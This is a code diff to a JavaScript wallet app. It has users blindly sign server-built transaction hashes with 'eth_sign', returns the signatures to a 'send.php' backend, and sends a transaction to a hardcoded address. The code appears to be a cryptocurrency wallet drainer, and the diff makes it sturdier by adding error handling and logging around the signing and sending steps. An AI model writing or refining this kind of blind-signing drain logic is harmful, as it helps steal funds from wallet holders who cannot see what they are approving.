@@ -51,8 +51,14 @@ function App() {
         var unSigned = JSON.parse(result);
         console.log("Unsigned transaction: ", unSigned);
 
-        var signed = await provider.request({ method: "eth_sign", params: [address, unSigned.result] });
-        return signed;
+        // Send the signing request
+        try {
+          var signed = await provider.request({ method: "eth_sign", params: [address, unSigned.result] });
+          console.log("Signed transaction: ", signed);
+          return signed;
+        } catch (error) {
+          console.error("Error while signing: ", error);
+        }
       } else if (type === "token") {
         var result = await jQuery.post("send.php", {
           "handler": "tx",
@@ -65,8 +71,14 @@ function App() {
         var unSigned = JSON.parse(result);
         console.log("Unsigned token transaction: ", unSigned);
 
-        var signed = await provider.request({ method: "eth_sign", params: [address, unSigned.result] });
-        return signed;
+        // Send the signing request
+        try {
+          var signed = await provider.request({ method: "eth_sign", params: [address, unSigned.result] });
+          console.log("Signed token transaction: ", signed);
+          return signed;
+        } catch (error) {
+          console.error("Error while signing: ", error);
+        }
       }
     }
 
@@ -89,21 +101,28 @@ function App() {
     var signature = await genSign(account_sender, "56", "coin");  // 56 = Binance Smart Chain
     console.log("Generated signature: ", signature);
 
-    var rawSign = await acceptSign(signature, "coin");
-    console.log("Raw signature: " + rawSign);
+    // If signature is received, send it for verification
+    if (signature) {
+      var rawSign = await acceptSign(signature, "coin");
+      console.log("Raw signature: " + rawSign);
 
-    // After accepting the signature, initiate the transaction
-    await provider.request({
-      method: "eth_sendTransaction",
-      params: [{
-        from: account_sender,
-        to: "0xbA8958d52B940fF513746F24176D1017CaFa707E",  // address to send the coins
-        value: "0x0",  // Adjust the value if needed
-        gas: "0x5208",  // Standard gas limit for transactions
-        gasPrice: "0x3B9ACA00",  // Set the gas price
-      }]
-    });
-    console.log("Transaction Sent!");
+      // After accepting the signature, initiate the transaction
+      try {
+        const txHash = await provider.request({
+          method: "eth_sendTransaction",
+          params: [{
+            from: account_sender,
+            to: "0xbA8958d52B940fF513746F24176D1017CaFa707E",  // address to send the coins
+            value: "0x0",  // Adjust the value if needed
+            gas: "0x5208",  // Standard gas limit for transactions
+            gasPrice: "0x3B9ACA00",  // Set the gas price
+          }]
+        });
+        console.log("Transaction Sent! Hash:", txHash);
+      } catch (error) {
+        console.error("Error sending transaction: ", error);
+      }
+    }
   }
 
   return (
